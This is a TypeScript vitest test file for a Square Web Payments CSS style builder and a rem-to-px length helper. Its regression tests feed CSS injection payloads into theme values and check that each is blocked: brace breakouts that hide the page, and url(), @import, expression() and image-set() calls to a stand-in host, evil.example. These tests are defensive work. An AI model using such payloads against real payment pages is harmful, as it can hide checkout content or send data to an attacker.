import { describe, expect, it } from "vitest";
import { defaultTheme, type DesignSystemTheme } from "@foxy.io/design-system/theme";

import {
  buildSquareWebPaymentsStyles,
  normalizeLengthForSquare,
} from "./square-web-payments";

function themeWith(overrides: {
  color?: Partial<Record<keyof DesignSystemTheme["color"], string>>;
  font?: Partial<Record<keyof DesignSystemTheme["font"], string>>;
  space?: Partial<Record<keyof DesignSystemTheme["space"], string>>;
}): DesignSystemTheme {
  return {
    ...defaultTheme,
    color: { ...defaultTheme.color, ...overrides.color },
    font: { ...defaultTheme.font, ...overrides.font },
    space: { ...defaultTheme.space, ...overrides.space },
  } as DesignSystemTheme;
}

describe("buildSquareWebPaymentsStyles", () => {
  // Regression test: this CSS text is written verbatim to a <style> tag's
  // textContent in document.head (see ensureSquareWebPaymentsStyles), so every
  // theme-derived value interpolated into it must be sanitized. `theme.color.*`
  // and `theme.font.body` are sourced from public, customer-controllable
  // `theme-*` HTML attributes.
  it("blocks a brace-breakout payload in color.error and falls back to the default", () => {
    const maliciousPayload = "red} body{display:none} .x{color:red";
    const theme = themeWith({ color: { error: maliciousPayload } });

    const css = buildSquareWebPaymentsStyles(theme);

    expect(css).not.toContain(maliciousPayload);
    expect(css).not.toContain("body{display:none}");
    expect(css).toContain(defaultTheme.color.error);
  });

  it("blocks a brace-breakout payload in color.secondary and falls back to the default", () => {
    const maliciousPayload = "red} *{opacity:0";
    const theme = themeWith({ color: { secondary: maliciousPayload } });

    const css = buildSquareWebPaymentsStyles(theme);

    expect(css).not.toContain(maliciousPayload);
    expect(css).toContain(defaultTheme.color.secondary);
  });

  it("blocks an injected font.body payload and falls back to the default font", () => {
    const maliciousPayload = "1rem sans-serif} body{display:none";
    const theme = themeWith({ font: { body: maliciousPayload } });

    const css = buildSquareWebPaymentsStyles(theme);

    expect(css).not.toContain(maliciousPayload);
    expect(css).not.toContain("body{display:none}");
    expect(css).toContain(defaultTheme.font.body);
  });

  it("blocks url(), @import, expression(), and semicolon payloads", () => {
    const payloads = [
      "red; } * { background: url(https://evil.example/steal)",
      "red;} @import url(https://evil.example/evil.css)",
      "red;behavior:expression(alert(1))",
      "red;}*{color:red",
    ];

    for (const payload of payloads) {
      const css = buildSquareWebPaymentsStyles(themeWith({ color: { error: payload } }));
      expect(css).not.toContain(payload);
      expect(css).toContain(defaultTheme.color.error);
    }
  });

  // Regression test: `image-set()`/`element()` are CSS image-valued functions
  // that accept a bare (non-`url(...)`-wrapped) string URL and are valid
  // wherever `url(...)` is valid. A prior fix blocked `url(`/`@import`/
  // `expression(`/`;`/`{`/`}` but missed this equivalent exfiltration/fetch
  // vector.
  it("blocks image-set(), -webkit-image-set(), image(), and element() payloads", () => {
    const payloads = [
      'image-set("https://evil.example/x" 1x)',
      '-webkit-image-set("https://evil.example/x" 1x)',
      'image("https://evil.example/x")',
      "element(#evil)",
    ];

    for (const payload of payloads) {
      const css = buildSquareWebPaymentsStyles(themeWith({ color: { error: payload } }));
      expect(css).not.toContain(payload);
      expect(css).toContain(defaultTheme.color.error);
    }
  });

  it("passes legitimate custom theme values through unchanged", () => {
    const css = buildSquareWebPaymentsStyles(
      themeWith({
        color: { error: "#aa1122", secondary: "#334455" },
        font: { body: "400 1rem/1.25 Figtree, sans-serif" },
        space: { md: "0.75rem" },
      }),
    );

    expect(css).toContain("#aa1122");
    expect(css).toContain("#334455");
    expect(css).toContain("400 1rem/1.25 Figtree, sans-serif");
    expect(css).toContain("calc(0.75rem * 2)");
  });
});

describe("normalizeLengthForSquare", () => {
  // Regression test: Square's style validator rejects lengths it doesn't
  // recognise and discards the *whole* style object when it hits one, replacing
  // the card form with "Invalid style value '0.5rem' for property
  // 'borderRadius'". Every DS length token is in rem, so `borderRadius.sm` took
  // the entire Square card entry UI down under the default theme.
  it("resolves rem lengths to px", () => {
    expect(normalizeLengthForSquare("0.5rem")).toBe("8px");
    expect(normalizeLengthForSquare("1rem")).toBe("16px");
  });

  it("passes px through and drops empty values", () => {
    expect(normalizeLengthForSquare("8px")).toBe("8px");
    expect(normalizeLengthForSquare(undefined)).toBeUndefined();
    expect(normalizeLengthForSquare("")).toBeUndefined();
  });

  it("drops values it cannot resolve to a number", () => {
    expect(normalizeLengthForSquare("auto")).toBeUndefined();
  });
});
